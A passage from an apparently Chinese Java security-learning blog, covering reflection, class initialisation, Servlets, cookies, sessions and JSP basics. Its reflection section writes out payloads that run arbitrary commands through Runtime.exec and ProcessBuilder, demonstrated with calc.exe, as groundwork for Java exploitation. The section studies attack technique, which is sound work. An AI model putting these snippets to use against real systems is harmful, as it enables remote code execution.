input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是对method对象执行invoke方法调用，通过传入参数，指定对象，即可调用该方法。我在上述代码中添加了修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">                method.setAccessible(true);  &#x2F;&#x2F;打开私有访问</span><br><span class="line">                method.invoke(new abc(),2);   &#x2F;&#x2F;new 这里invoke第一个参数指定实例化对象，之后的参数代表传入方法的参数</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">    private void func2(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取构造方法并执行"><a href="#获取构造方法并执行" class="headerlink" title="获取构造方法并执行"></a>获取构造方法并执行</h4><p>获得构造方法，主要是通过 getConstructors()和getDeclaredConstructors() ，后者能访问私有对象,下面是用遍历法获得所有构造函数信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">        Constructor[] conArray &#x3D; clazz.getDeclaredConstructors();</span><br><span class="line">            for (Constructor a:conArray)&#123;</span><br><span class="line">                a.setAccessible(true);</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;私有的构造方法   年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://www.const27.com/wp-content/uploads/2020/12/image-53.png" alt="img"><br>运行结果</p><p>我们刚才提过,getFiled()附带参数可以指定访问某一个属性，同理，getConstructor也一样，我们想要执行某一个类的构造方法，往往这个方法更实用<br>要执行一个类的构造方法，那我们需要创建一个该类的实例化对象，这个过程我们用newInstance()方法实现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">        Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line"></span><br><span class="line">        Constructor test &#x3D; clazz.getDeclaredConstructor(int.class);  &#x2F;&#x2F;指定参数，即可从多个重载的构造函数指定到某个具体的构造函数</span><br><span class="line">        test.setAccessible(true);</span><br><span class="line">        test.newInstance(12);  &#x2F;&#x2F;私有构造方法只需调用一下newInstance传入参数即可</span><br><span class="line"></span><br><span class="line">        Constructor test2 &#x3D; clazz.getDeclaredConstructor(String.class,int.class);</span><br><span class="line">        test2.newInstance(&quot;tom&quot;,15);  &#x2F;&#x2F;公有构造方法也一样</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public abc(String name,int age)&#123;</span><br><span class="line">        System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line">    private abc(int age)&#123;</span><br><span class="line">        System.out.println(&quot;私有的构造方法   年龄：&quot;+ age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151513.png" alt="QQ截图20210219151513"></p><h2 id="反射的进阶与安全"><a href="#反射的进阶与安全" class="headerlink" title="反射的进阶与安全"></a>反射的进阶与安全</h2><h3 id="Class-forName-实质与类初始化"><a href="#Class-forName-实质与类初始化" class="headerlink" title="Class.forName 实质与类初始化"></a>Class.forName 实质与类初始化</h3><p>Class.forName(“…”) 常被我们拿来获得类对象，但是实际上，Class.forname有三个参数，只不过我们默认输第一个参数：类名就能完成工作了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是Class.fornName函数原型</span><br><span class="line">public static Class&lt;?&gt; forName(String name, boolean initialize,</span><br><span class="line">                                   ClassLoader loader)</span><br><span class="line"></span><br><span class="line">Class.forName(className)</span><br><span class="line">&#x2F;&#x2F; 等于</span><br><span class="line">Class.forName(className, true, currentLoader)</span><br></pre></td></tr></table></figure><p>这里我们看见有三个参数，第一个参数是指定类名就不多讲了，第二个参数是决定类是否初始化（这个稍后会详细阐明），第三个是ClassLoader类加载器（告诉JVM如何加载这个类这里不展开说）</p><p>关于一个类的初始化，有三种操作可以实现:构造方法，空块和static块，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class TrainPrint &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(&quot;Empty block initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> static &#123;</span><br><span class="line"> System.out.printf(&quot;Static initial %s\n&quot;, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> public TrainPrint() &#123;</span><br><span class="line"> System.out.printf(&quot;Initial %s\n&quot;, this.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么执行顺序是如何呢，在引入父类的情况下又是如何呢？我们写个demo看看</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        abc a &#x3D; new abc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;b空块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; b static块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public b()&#123;</span><br><span class="line">        System.out.println(&quot;b类构造方法已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class abc extends b&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;a空块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot; a static块已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public abc() &#123;</span><br><span class="line">        System.out.println(&quot;a初始化方法已执行&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151831.png" alt="QQ截图20210219151831"></p><p>我们可以清晰的看到执行顺序，对继承类来说，<br>1.会先执行父类static块<br>2.执行自己的static块<br>3.执行父类空快<br>4.执行父类构造方法<br>5.执行自己空快<br>6.执行自己构造方法</p><p>对于一个类来说，执行顺序则是<br>1.执行static块<br>2.执行空快<br>3.执行构造方法</p><p>那么对于Class.forName指定的是否进行类初始化参数，指的是哪个部分？static块，空块还是构造方法?答案是只会执行static块里的，且会优先执行父类的static块。<br>我们把上面代码中的主函数替换为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Class clazz &#x3D; Class.forName(&quot;abc&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>执行一下，看结果。发现只执行了static块</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151840.png" alt="QQ截图20210219151840"></p><p>也就是说，Class.forName()会默认执行类的static代码块，是个比较危险的信号。<br>另外一提，xxx.class.newinstance() 会自动调用类的构造方法。</p><h3 id="Runtime执行命令解析"><a href="#Runtime执行命令解析" class="headerlink" title="Runtime执行命令解析"></a>Runtime执行命令解析</h3><p>一般来说，我们调用Runtime类来执行命令时的指定是这样的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exe()</span><br></pre></td></tr></table></figure><p>我们到源码里分析这段代码</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151850.png" alt="QQ截图20210219151850"></p><p>可见，当我们对Runtime类执行getRuntime()时会得到一个Runtime对象，然后我们就可以调用我们的exec方法了<br>同时，Runtime() 被private修饰符修饰了，这说明我们无法通过Runtime a = new Runtime()来实现一个Runtime的对象。<br>所以说，我们正常地使用runtime来执行命令只能依靠以上代码。</p><p>那么我们要是想要依靠反射来写一个Runtime执行任意命令的payload，那么该如何写呢？</p><p>先来一个错误示范，当我们用常规的思路去实现时。我们直接调用Runtime类里的exec方法，然后通过newInstance来实例化一个Runtime对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method method &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">method.invoke(clazz.newInstance(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>最终结果则是报错：class test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”<br>看来通过反射也不能直接调用exec方法，或者说不能实例化Runtime对象。<br>那么正确思路该是什么呢？应该是先调用getRuntime获得Runtime对象，然后再调用exec方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Method MgetRuntime &#x3D; clazz.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">Object runtime &#x3D; MgetRuntime.invoke(clazz);  &#x2F;&#x2F;对类对象使用getRuntime(),其实就相当于Runtime.getRuntime()。这种方式仅限static方法</span><br><span class="line">Method Mexec &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">Mexec.invoke(runtime,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p>最终弹出计算器。</p><h3 id="ProcessBuilder执行命令的反射实现"><a href="#ProcessBuilder执行命令的反射实现" class="headerlink" title="ProcessBuilder执行命令的反射实现"></a>ProcessBuilder执行命令的反射实现</h3><p>除了Runtime以外，还可以用ProcessBuilder类来执行命令。<br>它的正常情况使用如下.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProcessBuilder pb &#x3D; new ProcessBuilder(&quot;calc.exe&quot;);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure><p>我们来分析一下ProcessBuilder的构造方法，它的构造方法有很多个重载，我们分析一个吧。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151901.png" alt="QQ截图20210219151901"></p><p>可见，ProcessBuilder的构造方法把传入参数保存到了command属性里，然后commad会被以系统命令调用（这部分代码就不贴出来了）。</p><p>那么以反射的形式该如何实现呢。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">            Method start &#x3D; clazz.getMethod(&quot;start&quot;);</span><br><span class="line">            start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cmd.exe&quot;))); </span><br></pre></td></tr></table></figure><h1 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h1><h3 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h3><h4 id="1-调用init-方法进行初始化"><a href="#1-调用init-方法进行初始化" class="headerlink" title="1.调用init()方法进行初始化"></a>1.调用init()方法进行初始化</h4><p>init()方法在第一次创建servlet时被调用，用于进行初始化操作。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void init() throws ServletException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="2-调用service-方法处理客户端请求"><a href="#2-调用service-方法处理客户端请求" class="headerlink" title="2.调用service()方法处理客户端请求"></a>2.调用service()方法处理客户端请求</h4><p>web服务器，即servlet容器调用service()方法处理来自客户端的请求，并返回响应。同时根据客户端请求的类型（Get，Post，delete等），做出不同的行为，这些行为是由service方法抽象出的其他方法（doGet，doPost等）。<br>所以这里说的调用service()方法也就是等同于调用doGet，doPost等方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">doPost,doDelete等方法的定义形同于下</span><br><span class="line">public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException&#123;...code...&#125;</span><br></pre></td></tr></table></figure><h4 id="3-调用distroy-在Servlet销毁前完成清理活动"><a href="#3-调用distroy-在Servlet销毁前完成清理活动" class="headerlink" title="3.调用distroy()在Servlet销毁前完成清理活动"></a>3.调用distroy()在Servlet销毁前完成清理活动</h4><p>distrtoy()函数只调用一次，在Servlet被销毁前完成后台线程停止，数据库链接关闭等一系列清理工作。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void destroy() &#123;</span><br><span class="line">  &#x2F;&#x2F; 终止化代码...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编写一个简单的Servlet"><a href="#编写一个简单的Servlet" class="headerlink" title="编写一个简单的Servlet"></a>编写一个简单的Servlet</h3><p>我们写一个程序，用来控制Get请求的响应</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)    &#x2F;&#x2F;用于设定路由</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request,</span><br><span class="line">                      HttpServletResponse response)</span><br><span class="line">            throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        out.println(&quot;&lt;h1&gt;&quot; + &quot;a&quot; + &quot;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至于部署我是参考的这个文章<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a><br>我的版本时idea 2020.2，可能会有出入。</p><h3 id="处理传参"><a href="#处理传参" class="headerlink" title="处理传参"></a>处理传参</h3><p>servlet处理传参主要是通过doGet和doPost方法进行的。<br>接收参数值主要是靠下面的方法</p><ul><li><strong>getParameter()：</strong>您可以调用 request.getParameter() 方法来获取表单参数的值。</li><li><strong>getParameterValues()：</strong>如果参数出现一次以上，则调用该方法，并返回多个值，例如复选框。</li><li><strong>getParameterNames()：</strong>如果您想要得到当前请求中的所有参数的完整列表，则调用该方法。</li></ul><p>我们写个demo试试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个demo主要用于接收get数据，并做出一些处理返回.<br>那么如何接收POST数据呢？和doGet差不多</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line">    </span><br><span class="line">    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException</span><br><span class="line">    &#123;</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html&quot;);</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">        String name &#x3D; new String(request.getParameter(&quot;name&quot;));</span><br><span class="line">        out.println(&quot;[Post]your name is &quot;+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">需要注意的是，这里的request.getParameter(&quot;name&quot;)会优先选择在url里的参数，而不是http包体的参数</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152111.png" alt="QQ截图20210219152111"></p><h3 id="cookie-amp-session"><a href="#cookie-amp-session" class="headerlink" title="cookie&amp;session"></a>cookie&amp;session</h3><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>cookie的主要方法如下</p><table><thead><tr><th align="left">序号</th><th align="left">方法 &amp; 描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>public void setDomain(String pattern)</strong> 该方法设置 cookie 适用的域，例如 runoob.com。</td></tr><tr><td align="left">2</td><td align="left"><strong>public String getDomain()</strong> 该方法获取 cookie 适用的域，例如 runoob.com。</td></tr><tr><td align="left">3</td><td align="left"><strong>public void setMaxAge(int expiry)</strong> 该方法设置 cookie 过期的时间（以秒为单位）。如果不这样设置，cookie 只会在当前 session 会话中持续有效。</td></tr><tr><td align="left">4</td><td align="left"><strong>public int getMaxAge()</strong> 该方法返回 cookie 的最大生存周期（以秒为单位），默认情况下，-1 表示 cookie 将持续下去，直到浏览器关闭。</td></tr><tr><td align="left">5</td><td align="left"><strong>public String getName()</strong> 该方法返回 cookie 的名称。名称在创建后不能改变。</td></tr><tr><td align="left">6</td><td align="left"><strong>public void setValue(String newValue)</strong> 该方法设置与 cookie 关联的值。</td></tr><tr><td align="left">7</td><td align="left"><strong>public String getValue()</strong> 该方法获取与 cookie 关联的值。</td></tr><tr><td align="left">8</td><td align="left"><strong>public void setPath(String uri)</strong> 该方法设置 cookie 适用的路径。如果您不指定路径，与当前页面相同目录下的（包括子目录下的）所有 URL 都会返回 cookie。</td></tr><tr><td align="left">9</td><td align="left"><strong>public String getPath()</strong> 该方法获取 cookie 适用的路径。</td></tr><tr><td align="left">10</td><td align="left"><strong>public void setSecure(boolean flag)</strong> 该方法设置布尔值，表示 cookie 是否应该只在加密的（即 SSL）连接上发送。</td></tr><tr><td align="left">11</td><td align="left"><strong>public void setComment(String purpose)</strong> 设置cookie的注释。该注释在浏览器向用户呈现 cookie 时非常有用。</td></tr><tr><td align="left">12</td><td align="left"><strong>public String getComment()</strong> 获取 cookie 的注释，如果 cookie 没有注释则返回 null。</td></tr></tbody></table><p>我们马上写一个demo，这个demo会用到 response.addCookie用于在响应头里添加cookie，cookie.setMaxAge 用于设置cookie的有效期，request.getCookies 用于获取请求里的cookie数组<br>这里的demo有两个，一个用于添加cookie，一个用于输出cookie</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于添加cookie</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie name &#x3D; new Cookie(&quot;name&quot;, request.getParameter(&quot;name&quot;)); &#x2F;&#x2F; 中文转码</span><br><span class="line"></span><br><span class="line">        name.setMaxAge(60*60*24);</span><br><span class="line"></span><br><span class="line">        response.addCookie( name );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出cookie值</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;b&quot;)</span><br><span class="line">public class test2 extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        Cookie cookie &#x3D; null;</span><br><span class="line">        Cookie[] cookies &#x3D; null;</span><br><span class="line">        &#x2F;&#x2F; 获取与该域相关的 Cookie 的数组</span><br><span class="line">        cookies &#x3D; request.getCookies();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 设置响应内容类型</span><br><span class="line">        response.setContentType(&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line">            for (int i &#x3D; 0; i &lt; cookies.length; i++)&#123;</span><br><span class="line">                if((cookies[i].getName()).compareTo(&quot;name&quot;)&#x3D;&#x3D;0)&#123;</span><br><span class="line">                    out.println(&quot;your name is &quot;+cookies[i].getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152122.png" alt="QQ截图20210219152122"></p><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><p>servle提供了一系列session接口辅助这个流程</p><table><thead><tr><th>1</th><th><strong>public Object getAttribute(String name)</strong> 该方法返回在该 session 会话中具有指定名称的对象，如果没有指定名称的对象，则返回 null。</th></tr></thead><tbody><tr><td>2</td><td><strong>public Enumeration getAttributeNames()</strong> 该方法返回 String 对象的枚举，String 对象包含所有绑定到该 session 会话的对象的名称。</td></tr><tr><td>3</td><td><strong>public long getCreationTime()</strong> 该方法返回该 session 会话被创建的时间，自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。</td></tr><tr><td>4</td><td><strong>public String getId()</strong> 该方法返回一个包含分配给该 session 会话的唯一标识符的字符串。</td></tr><tr><td>5</td><td><strong>public long getLastAccessedTime()</strong> 该方法返回客户端最后一次发送与该 session 会话相关的请求的时间自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。</td></tr><tr><td>6</td><td><strong>public int getMaxInactiveInterval()</strong> 该方法返回 Servlet 容器在客户端访问时保持 session 会话打开的最大时间间隔，以秒为单位。</td></tr><tr><td>7</td><td><strong>public void invalidate()</strong> 该方法指示该 session 会话无效，并解除绑定到它上面的任何对象。</td></tr><tr><td>8</td><td><strong>public boolean isNew()</strong> 如果客户端还不知道该 session 会话，或者如果客户选择不参入该 session 会话，则该方法返回 true。</td></tr><tr><td>9</td><td><strong>public void removeAttribute(String name)</strong> 该方法将从该 session 会话移除指定名称的对象。</td></tr><tr><td>10</td><td><strong>public void setAttribute(String name, Object value)</strong> 该方法使用指定的名称绑定一个对象到该 session 会话。</td></tr><tr><td>11</td><td><strong>public void setMaxInactiveInterval(int interval)</strong> 该方法在 Servlet 容器指示该 session 会话无效之前，指定客户端请求之间的时间，以秒为单位。</td></tr></tbody></table><p>写个demo吧，过一过就行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.text.*;</span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;&#x2F;a&quot;)</span><br><span class="line">public class test extends HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        HttpSession session &#x3D; request.getSession(); &#x2F;&#x2F;创建一个session对象</span><br><span class="line">        Date createtime &#x3D; new Date(session.getCreationTime());</span><br><span class="line">        Date lastAccessTime &#x3D; new Date(session.getLastAccessedTime());</span><br><span class="line">        PrintWriter out &#x3D; response.getWriter();</span><br><span class="line"></span><br><span class="line">        SimpleDateFormat df &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd:mm:ss&quot;);</span><br><span class="line">        String countkey &#x3D; new String(&quot;key&quot;);  &#x2F;&#x2F;访问次数的键</span><br><span class="line">        Integer count &#x3D; Integer.valueOf(0);   &#x2F;&#x2F;访问次数的值</span><br><span class="line">        String userID &#x3D; new String(&quot;Tom&quot;);    &#x2F;&#x2F;用户ID的值</span><br><span class="line">        String userIDKey &#x3D; new String(&quot;userIDKey&quot;);   &#x2F;&#x2F;用户ID的键</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(session.getAttribute(countkey)&#x3D;&#x3D;null)&#123;   &#x2F;&#x2F;如果获得该session的countkey这个键的值不存在时，为当前session初始化这个键</span><br><span class="line">            session.setAttribute(countkey,Integer.valueOf(0));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(session.isNew())&#123;   &#x2F;&#x2F;如果session是第一次创建，则为其初始化userID键</span><br><span class="line">            session.setAttribute(userIDKey,userID);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            count &#x3D; (Integer) session.getAttribute(countkey);</span><br><span class="line">            count &#x3D; count+1;</span><br><span class="line">            userID &#x3D; (String)session.getAttribute(userIDKey);</span><br><span class="line">        &#125;</span><br><span class="line">        session.setAttribute(countkey,count);</span><br><span class="line">        out.println(&quot;hello&quot;+userID+&quot;\nthis is the &quot;+count+&quot; to visit this website\n&quot;);</span><br><span class="line">        out.println(&quot;first time:&quot;+createtime+&quot;\n this time:&quot;+lastAccessTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3><p>JSP是脚本语言，与PHP等语言类似。JSP本质就是servlet，它存在的意义就是简化servlet复杂的程序过程</p><h3 id="JSP基础语法"><a href="#JSP基础语法" class="headerlink" title="JSP基础语法"></a>JSP基础语法</h3><h4 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h4><p>JSP和PHP等可以嵌入到HTML的脚本语言类似，需要用一个代码段包裹代码。<br>其格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% code %&gt;</span><br></pre></td></tr></table></figure><p>同时在代码段中还存在着指令标签:Page,include,taglib<br>他们的定义和作用如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page ...... %&gt;    </span><br><span class="line">page指令用于定义网页的各属性，如&lt;%@ page import&#x3D;&quot;...&quot; %&gt; 表示要导入哪些java模块,&lt;%@ page language&#x3D;&quot;...&quot; %&gt;表示JSP页面所用的语言，默认是java</span><br><span class="line"></span><br><span class="line">&lt;%@ include 